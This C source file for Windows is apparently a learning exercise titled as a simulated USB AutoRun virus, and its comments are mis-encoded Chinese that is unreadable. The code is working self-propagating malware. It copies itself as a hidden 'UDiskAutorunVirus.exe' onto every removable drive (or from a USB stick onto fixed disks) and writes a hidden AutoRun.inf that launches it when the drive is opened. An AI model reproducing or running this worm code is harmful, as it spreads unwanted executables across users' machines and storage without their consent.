/** Name: ģ��U��AutoRun����*/
/*
	�ļ��Ĵ򿪺͹رգ�

		�ļ��򿪺�����HANDLE CreateFile(
			LPCSTR lpFileName,//��Ҫ�򿪻��ߴ������ļ������߱���Ϊ�ļ����豸����
			DWORD dwDesiredAccess,//�ļ��ķ���ģʽ��ͨ����GENERIC_READ��GENERIC_WRITEֻ��ֻдģʽ��Ҳ����ʹ��λ��ʵ�ֶ�дͬʱ
			DWORD dwShareMode,//���ļ��Ĺ���ģʽ����ʶ�Ƿ���̹���������ԣ������ָ��
			LPSECURITY_ATTRIBUTES lpSecurityAttributes,//��ʶ��ȫ���ԣ���������ָ�����ص��ļ�����Ƿ��ܹ����̳У�����ΪNULL���޷����̳У���������ṹ��
			DWORD dwCreationDisposition,//�ڴ������ߴ򿪵��ļ�������ʱ�Ĵ���ʽ
			DWORD dwFlagsAndAttributes,//ָ���½��ļ������ԺͶ��ļ������ķ�ʽ
			HANDLE hTemplateFile);//�ļ�ģ������ϵͳ�����Ƹ��ļ����������Ե��½��ļ���
		����ֵ��ִ��ʧ�ܷ���INVALID_HANDLE_VALUE����ͨ��GetLastError()��ȡʧ��ԭ�������򷵻��ļ����

		�ļ��رպ�����BOOL CloseHandle(HANDLE handle);
		������Ҫ�رյ��ļ������Ҳ�������¼���������̾�����߳̾����һϵ�о��

	�ļ��Ĳ�����
		Ҳ�����ļ��ġ���ɾ�Ĳ顱�������������������ļ����ݱ���Ҳ�����ļ������Եȡ�

		ɾ���ļ�������BOOL DeleteFile(LPCTSTR lpFileName);
		����ļ����򿪣��������޷�ɾ����

		��ȡ�ļ����ݺ�����BOOL ReadFile(
			HANDLE hFile,//�ļ����
			LPVOID lpBuffer,//��ȡ���Ļ�����
			DWORD nNumberofBytesToRead,//Ҫ�������ֽ���
			LPDWORD lpNumberofBytesToRead,//ʵ�ʶ�����ֽ���
			LPOVERLAPPED lpOverlapped);//һ��ΪNULL

		д���ļ����ݺ�����BOOL WriteFile(//����ͬ��
			HANDLE hFile,
			LPCVOID lpBuffer,
			DWORD nNumberofBytesToWrite,
			LPDWORD lpNumberofBytesWritten,
			LPVOERLAPPED lpOverLapped);
						
		ǿ��ˢд�����̺�����BOOL FlushFileBuffers(HANDLE hFile);

		�ļ���дָ���ƶ�������DWORD SetFilePointer(
			HANDLE hFile,//�ļ����
			LONG lDistanceToMove,//ָ��Ҫ�ƶ���ָ�����
			PLONG lpDistanceToMoveHigh,//ָ��LONG���͵�ָ�룬�ƶ�����ĸ�32λ��һ��ΪNULL
			DWORD dwMoveMethod);//ָ���ƶ�����ʼλ�ã�FILE_BEGIN�ļ���ͷ��FILE_CURRENT��ǰ�ļ�λ�ã�FILE_END�ļ�β��

	������Ŀ¼������
		
		��ȡ���б����߼�������������DWORD GetLogicalDriveStrings(
			DWORD nBufferLength,//��������󳤶�
			LPTSTR lpBuffer);//��������ַ�������ʽΪ���磺C:\\\0D:\\\0 Ҳ����C:\ D:\�м���\0�ָ��˲�������strlen���㣬ÿ4���ֽ���һ���̷�
		����ֵ��ʵ�ʵĳ���

		��ȡ���������ͺ�����UINT GetDriveType(LPCSTR lpRootPathName);
		��������·�������磺C:\��D:\��
		����ֵ��
			DRIVE_UNKOWN:�޷�ʶ�������������
			DRIVE_NO_ROOT_DIR:��Ч��������·��
			DRIVE_REMOVEBLE:���ƶ������������磺U�̡��ƶ�Ӳ�̵�
			DRIVE_FIXED:�����ƶ��Ĵ��̣�Ӳ��
			DRIVE_REMOTE:����������
			DRIVE_CDROM:����������
			DRIVE_RAMDISK:����������

		����Ŀ¼�ĺ�����BOOL CreateDirectory(LPCTSTR lpPathName,LPSECURITY_ATTRIBUTES lpSecurityAttributes);
		������������Ŀ¼���ƣ���ȫ���ԣ�һ��ΪNULL��

		�Ƴ�Ŀ¼�ĺ�����BOOL RemoveDirectory(LPCTSTR lpPathName);
*/
#include<stdio.h>
#include<Windows.h>
//Autorun�ļ�����Ԥ׼��
const char autorunContent[] = { "[AutoRun]\n\
open=%s\n\
shell\\open=��(&O)\n\
shell\\open\\Command=%s\n\
shell\\explore=��Դ������(&X)\n\
shell\\explore\\Command=\"%s\"\n\
shellexecute=%s\n\
shell\\Auto\\Command=%s\n\
" };
//�Զ����еĳ�������Ҳ������������
const char runFileName[] = {"UDiskAutorunVirus.exe"};
//Autorun�ļ���
const char autoFileName[] = {"AutoRun.inf"};
void CopySelfAndBuildAutorun(char * selfPath,UINT driverType)
{
	//��ȡ�����������̷�,ÿ����·��֮����һ��\0,����ֵΪ�ܳ��ȣ���Ϊ\0�Ĵ��ڣ����磺C:\ D:\ E:\ 
	char driverString[MAXBYTE] = { 0 };
	DWORD len = GetLogicalDriveStrings(MAXBYTE, driverString);
	//��ǰ��ȡ�����̷��±꣬ѭ�����������̷�
	DWORD index = 0;
	while (index < len)
	{
		//��ȡ��ǰɨ����̷�
		char root[4] = { 0 };
		strncpy(root, &driverString[index], 3);
		//�ж��̷������Ƿ��Ǵ�������
		UINT type = GetDriveType(root);
		if (type == driverType)
		{
			//����������Ӧ���̷���Ŀ¼
			char targetPath[MAX_PATH] = { 0 };
			sprintf(targetPath, "%s%s\0", root, runFileName);
			CopyFile(selfPath, targetPath, FALSE);
			//�����ļ���������
			SetFileAttributes(targetPath, FILE_ATTRIBUTE_HIDDEN);
			//д��Autorun.inf�ļ�
			char targetAuto[MAX_PATH] = {0};
			sprintf(targetAuto, "%s%s", root, autoFileName);
			HANDLE file = CreateFile(targetAuto, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			DWORD written = 0;
			char fileContent[2048] = { 0 };
			sprintf(fileContent, autorunContent, runFileName, runFileName, runFileName, runFileName, runFileName);
			WriteFile(file, fileContent, strlen(fileContent),&written,NULL);
			CloseHandle(file);
			//����Autorun.inf��������
			SetFileAttributes(targetAuto, FILE_ATTRIBUTE_HIDDEN);
		}
		//������һ���̷�
		index += 4;
	}
}
int main(int argc, char * argv[])
{
	//��ֹ�������Ʊ����ģ�����һ�ξ͸Ļ���һ��
	rename(argv[0], runFileName);
	//��ȡ����������·��
	char selfPath[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, selfPath, MAX_PATH);
	//��ȡ·�����̷�
	char root[4] = { 0 };
	strncpy(root, selfPath, 3);
	//��ȡ�̷�������������
	UINT type = GetDriveType(root);
	switch (type)
	{
	case DRIVE_FIXED://��̬Ӳ�̣����ش��̣�
		CopySelfAndBuildAutorun(selfPath, DRIVE_REMOVABLE);//��Ӳ���Ͼͼ���Ƿ���ڿ��ƶ����̣�������������Autorun
		break;
	case DRIVE_REMOVABLE://���ƶ����̣�U�̣�
		CopySelfAndBuildAutorun(selfPath, DRIVE_FIXED);//����ڿ��ƶ������ϣ��͸�������Ӳ���ϲ�Autorun
		break;
	}
	return 0;
}